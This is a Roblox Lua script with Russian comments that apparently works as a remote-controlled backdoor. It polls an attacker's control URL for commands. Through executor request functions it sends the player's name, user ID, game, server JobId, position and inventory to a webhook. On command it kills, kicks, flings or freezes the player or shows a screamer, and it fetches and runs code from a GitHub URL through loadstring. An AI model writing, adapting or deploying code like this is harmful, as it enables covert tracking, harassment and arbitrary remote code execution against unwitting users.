-- Функция для получения инвентаря
local function getInventory()
    local tools = {}
    for _, v in pairs(lp.Backpack:GetChildren()) do table.insert(tools, v.Name) end
    for _, v in pairs(lp.Character:GetChildren()) do if v:IsA("Tool") then table.insert(tools, v.Name .. " (Equipped)") end end
    return #tools > 0 and table.concat(tools, ", ") or "Empty"
end

-- Мощная функция логов
local function sendLog(title, desc, color)
    pcall(function()
        local hrp = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
        local pos = hrp and string.format("X: %.1f, Y: %.1f, Z: %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z) or "Unknown"
        
        local data = {
            ["embeds"] = {{
                ["title"] = title,
                ["description"] = desc,
                ["color"] = color or 0xFF0000,
                ["fields"] = {
                    {["name"] = "👤 Игрок", ["value"] = "`" .. lp.Name .. " (" .. lp.UserId .. ")`", ["inline"] = true},
                    {["name"] = "🎮 Игра", ["value"] = "[" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
                    {["name"] = "🆔 JobId", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                    {["name"] = "📍 Координаты", ["value"] = "`" .. pos .. "`", ["inline"] = true},
                    {["name"] = "🎒 Инвентарь", ["value"] = "```" .. getInventory() .. "```", ["inline"] = false}
                },
                ["footer"] = {["text"] = "AxM v38 Premium • " .. os.date("%X")}
            }}
        }
        local req = (syn and syn.request) or (http and http.request) or http_request or request
        req({
            Url = settings.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Логика управления
task.spawn(function()
    local last_cmd = ""
    local flingConnection
    
    -- Инициализация (игнорируем старую команду)
    local _, res = pcall(function() return game:HttpGet(settings.control .. "?t=" .. tick()) end)
    if res then last_cmd = res:gsub("%s+", ""):lower() end

    while true do
        task.wait(settings.check_delay)
        
        local ok, res = pcall(function() 
            return game:HttpGet(settings.control .. "?nocache=" .. tick()) 
        end)

        if ok and res then
            local clean_res = res:match("^%s*(.-)%s*$") -- Полная очистка
            local current_cmd = clean_res:lower()

            if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                last_cmd = current_cmd
                
                local char = lp.Character or lp.CharacterAdded:Wait()
                local hrp = char:WaitForChild("HumanoidRootPart", 5)
                local hum = char:FindFirstChildOfClass("Humanoid")

                if hrp and hum then
                    -- [ ИСПОЛНЕНИЕ КОМАНД ] --
                    if current_cmd == "kill" then
                        hum.Health = 0
                        sendLog("💀 КОМАНДА: УБИЙСТВО", "Игрок был ликвидирован через панель.")

                    elseif current_cmd:find("gui") then
                        sendLog("🖥️ КОМАНДА: ЗАПУСК GUI", "Дистанционный запуск AxA Gui...")
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/arxitectorcz/Arxetector/refs/heads/main/AxA%20Gui"))()

                    elseif current_cmd:find("message") then
                        local msg = clean_res:match("%((.-)%)") or "System Message"
                        local g = Instance.new("ScreenGui", lp.PlayerGui)
                        local t = Instance.new("TextLabel", g)
                        t.Size = UDim2.new(1,0,0.2,0); t.Position = UDim2.new(0,0,0.4,0); t.Text = msg; t.TextScaled = true; t.BackgroundColor3 = Color3.new(0,0,0); t.TextColor3 = Color3.new(1,1,1)
                        task.delay(5, function() g:Destroy() end)
                        sendLog("📢 КОМАНДА: СООБЩЕНИЕ", "Текст: " .. msg, 0x00FF00)

                    elseif current_cmd == "screamer" then
                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
                        local g = Instance.new("ScreenGui", lp.PlayerGui)
                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
                        task.delay(3, function() g:Destroy() end)
                        sendLog("😱 КОМАНДА: СКРИМЕР", "Игрок получил инфаркт.")

                    elseif current_cmd:find("kick") then
                        local r = clean_res:match("%((.-)%)") or "Connection Error"
                        sendLog("🚪 КОМАНДА: КИК", "Причина: " .. r, 0xFFFF00)
                        task.wait(0.5)
                        lp:Kick(r)

                    elseif current_cmd == "fling" then
                        if flingConnection then flingConnection:Disconnect() end
                        flingConnection = RunService.Heartbeat:Connect(function()
                            hrp.Velocity = Vector3.new(0, 9999, 0)
                            hrp.RotVelocity = Vector3.new(0, 9999, 0)
                        end)
                        sendLog("🌪️ КОМАНДА: ФЛИНГ", "Активирован режим полета.")

                    elseif current_cmd == "unfling" then
                        if flingConnection then flingConnection:Disconnect() end
                        sendLog("🛡️ КОМАНДА: УНФЛИНГ", "Флинг отключен.")

                    elseif current_cmd == "freeze" then
                        hrp.Anchored = true
                        sendLog("🧊 КОМАНДА: ФРИЗ", "Игрок застыл.")

                    elseif current_cmd == "unfreeze" then
                        hrp.Anchored = false
                        sendLog("🔥 КОМАНДА: УНФРИЗ", "Игрок разморожен.")
                    end
                end
            end
        end
    end
end)

